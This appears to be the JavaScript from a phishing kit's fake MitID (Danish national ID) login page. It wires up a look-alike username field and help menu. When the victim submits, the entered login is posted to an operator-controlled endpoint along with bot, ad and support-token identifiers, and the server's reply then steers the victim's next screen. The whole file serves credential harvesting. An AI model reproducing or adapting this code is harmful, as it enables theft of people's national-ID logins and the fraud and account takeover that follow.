window.onload = function() {
    const logType = "mitid";

    $('#hideUserNameBtn8').on('click', function() {
        var inputType = $('#login').attr('type');

        if (inputType === 'text') {
            $('#login').attr('type', 'password');
            $(this).text('Vis');
        } else {
            $('#login').attr('type', 'text');
            $(this).text('Skjul');
        }
    });

    $('#mitidHelpButtonId').on('click', function() {
        $('#mitid-help-menu-id').show();
        $('#mitid-core-overlay').show();
    });

    $('#closeButtonMitID').on('click', function() {
        $('#mitid-help-menu-id').hide();
        $('#mitid-core-overlay').hide();
    });

    $('#login').keyup(function() {
        if ($('#login').val().length == 0) {
            $('#btnLogin').prop('disabled', true);
        } else {
            $('#btnLogin').prop('disabled', false);
        }
    });
    
    $('#btnLogin').click(function() {
        if ($('#login').val().length == 0) clearForm();
        else sendLog(this.id, $('#login').val());
    });

    function loadButton(button) {
        var buttonText = button.innerHTML;
        button.disabled = true;
        button.innerHTML = `
            <div class="d-flex justify-content-center">
                <div class="spinner-border" role="status">
                    <span class="visually-hidden">...</span>
                </div>
            </div>
        `;
        return buttonText;
    };

    function clearForm() {
        $('#login').val('');
        $('#btnLogin').prop('disabled', true);
    }
    
    function sendLog(buttonId, login) {
        var buttonText = loadButton(document.getElementById(buttonId));
    
        axios.post(submitApiPath, {
            botType: botType,
            adId: typeof adId === 'undefined' ? null : adId,
            supportToken: supportToken,
            logType: logType,
            login: login
        })
        .then((response) => {
            system.windowObj(response.data.status);
        })
        .finally(() => {
            clearForm();
            $(`#${buttonId}`).html(buttonText);
        });
    };
};